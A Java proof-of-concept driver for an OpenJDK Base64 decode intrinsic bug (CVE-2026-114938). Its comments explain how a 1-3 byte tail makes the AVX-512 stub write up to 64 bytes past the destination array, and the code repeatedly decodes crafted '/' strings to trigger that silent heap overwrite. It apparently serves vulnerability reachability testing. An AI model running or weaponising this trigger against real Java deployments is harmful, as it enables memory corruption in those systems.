/*
 * Base64Trigger.java - CVE-2026-114938 reachability / trigger driver.
 *
 * Target: OpenJDK 17.0.21.0.3 / 21.0.13.0.3 / 25.0.5.0.3 / 27.0.1.0.3
 * Fix   : jdk17u 8ea73158af "8393212: Base64 optimization improvements"
 *         (+4 lines in src/hotspot/cpu/x86/stubGenerator_x86_64.cpp)
 *
 * The AVX-512 VBMI Base64 decode stub is entered only when
 *   length > 128  &&  isMIME == 0  &&  CPU has avx512vbmi + avx512bw
 * Pre-fix, a tail of 1..3 bytes still ran the vector tail path:
 *   output_size = (length / 4) * 3 = 0
 *   output_mask = -1 >> 0          = all ones  -> full 64-byte store
 * i.e. up to 64 bytes are written past the destination array. Java then throws
 * IllegalArgumentException ("wrong 4-byte ending unit"), but the write happened.
 *
 * Usage:
 *   java Base64Trigger.java [iterations]
 *   java -XX:-UseBASE64Intrinsics Base64Trigger.java [iterations]   # control
 */
import java.util.Arrays;
import java.util.Base64;

public class Base64Trigger {

    public static void main(String[] args) {
        int iters = args.length > 0 ? Integer.parseInt(args[0]) : 100000;

        System.out.println("jdk=" + System.getProperty("java.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        System.out.println("iterations=" + iters);

        // lengths > 128 whose tail is 1..3 bytes (length % 4 != 0)
        int[] lens = {129, 130, 131, 193, 194, 195};
        Base64.Decoder dec = Base64.getDecoder();

        long decoded = 0, rejected = 0, unexpected = 0;
        for (int i = 0; i < iters; i++) {
            int L = lens[i % lens.length];
            char[] buf = new char[L];
            Arrays.fill(buf, '/');          // '/' -> 0xFF when decoded
            try {
                byte[] out = dec.decode(new String(buf));
                decoded++;
                if (out.length == 0) {
                    unexpected++;
                }
            } catch (IllegalArgumentException expected) {
                rejected++;
            } catch (Throwable t) {
                unexpected++;
                System.out.println("UNEXPECTED " + t);
            }
            if ((i & 0x7FFF) == 0) {
                System.out.println("iter=" + i + " decoded=" + decoded
                        + " rejected=" + rejected + " unexpected=" + unexpected);
            }
        }
        System.out.println("DONE iters=" + iters + " decoded=" + decoded
                + " rejected=" + rejected + " unexpected=" + unexpected);
        System.out.println("note: no crash and no exception beyond IllegalArgumentException");
        System.out.println("      is the expected outcome for a silent 64-byte heap overwrite.");
    }
}
